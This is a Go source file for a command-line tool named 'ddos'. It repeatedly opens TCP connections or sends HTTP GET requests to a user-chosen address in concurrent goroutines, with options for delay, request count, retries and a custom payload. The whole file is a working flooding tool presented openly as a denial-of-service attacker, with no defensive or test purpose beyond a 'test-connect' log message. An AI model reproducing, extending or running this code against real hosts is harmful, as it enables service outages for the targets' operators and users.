package main

import (
	"fmt"
	"github.com/Streamer272/ddos/logger"
	"github.com/Streamer272/ddos/options"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"syscall"
	"time"
)

const (
	HttpMessage   = "GET / HTTP/1.1\n"
	SocketMessage = "abcdefghijklmnopqrstuvwxyz1234567890"
)

func ddos(opt options.Options) error {
	if opt.ForceHttps {
		_, err := http.Get(opt.Address)
		if err != nil {
			return err
		}

		return nil
	}

	conn, err := net.Dial("tcp", opt.Address)
	if err != nil {
		return err
	}
	message := ""
	if opt.Message != "" {
		message = opt.Message
	} else {
		if opt.Http {
			message = HttpMessage
		} else {
			message = SocketMessage
		}
	}
	_, err = fmt.Fprintf(conn, "%v\n", message)
	if err != nil {
		return err
	}

	return nil
}

func fixAddress(opt *options.Options, log logger.Logger) {
	protocolMatch, err := regexp.MatchString("https?://.*", opt.Address)
	if err != nil {
		log.Log("ERROR", fmt.Sprintf("Couldn't match regex, %v...", err), true)
	}
	if opt.ForceHttps && !protocolMatch && err == nil {
		log.Log("WARN", fmt.Sprintf("%v does not have protocol, using https://", opt.Address), true)
		opt.Address = "https://" + opt.Address
	}
	if !strings.Contains(opt.Address, ":") {
		log.Log("WARN", fmt.Sprintf("%v does not contain port, using 80...", opt.Address), true)
		opt.Address = opt.Address + ":80"
	}
}

func main() {
	opt := options.Parse()
	log := logger.NewLogger(opt)
	currentRetryCount := 0
	currentRequestCount := 0

	// warnings
	if opt.Delay <= 0 {
		log.Log("WARN", "Undefined delay may cause system to lag...", true)
	}
	if opt.OutputFile != "" && !strings.HasSuffix(opt.OutputFile, ".log") {
		outputFileSplit := strings.Split(opt.OutputFile, ".")
		log.Log("WARN", fmt.Sprintf("Recommended extension for output file is .log, has .%v...", outputFileSplit[len(outputFileSplit)-1]), true)
	}

	fixAddress(&opt, log)

	// errors
	err := ddos(opt)
	if err != nil {
		log.Log("ERROR", fmt.Sprintf("Couldn't run test-connect, error: %v...", err), true)

		if !opt.IgnoreError {
			os.Exit(1)
		}
	}
	if opt.OutputFile != "" {
		err := ioutil.WriteFile(opt.OutputFile, []byte(""), 0777)
		if err != nil {
			log.Log("ERROR", fmt.Sprintf("Couldn't rewrite file, %v...", err), false)

			if !opt.IgnoreError {
				os.Exit(1)
			}
		}
	}

	time.Sleep(time.Second)

	log.Log("INFO", "Starting DDOS...", true)

	exitMessage := make(chan string)

	go func() {
		for {
			go func() {
				err := ddos(opt)
				if err != nil {
					log.Log("WARN", fmt.Sprintf("%v", err), true)

					if opt.MaxRetryCount <= 0 {
						return
					}

					if currentRetryCount += 1; currentRetryCount > opt.MaxRetryCount {
						exitMessage <- fmt.Sprintf("Reached max retry count (%v), exiting...", opt.MaxRetryCount)
					}
				} else {
					log.Log("INFO", fmt.Sprintf("Successfully send packet to %v...", opt.Address), true)
				}

				if opt.RequestCount > 0 {
					currentRequestCount++

					if currentRequestCount >= opt.RequestCount {
						exitMessage <- fmt.Sprintf("Request count reached (%v), exiting...", opt.RequestCount)
					}
				}
			}()

			time.Sleep(time.Millisecond * time.Duration(opt.Delay))
		}
	}()

	go func() {
		interruptSignal := make(chan os.Signal)
		signal.Notify(interruptSignal, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
		<-interruptSignal
		exitMessage <- "Interrupted by user, exiting..."
	}()

	exitMessageString := <-exitMessage
	log.Log("INFO", exitMessageString, true)
}
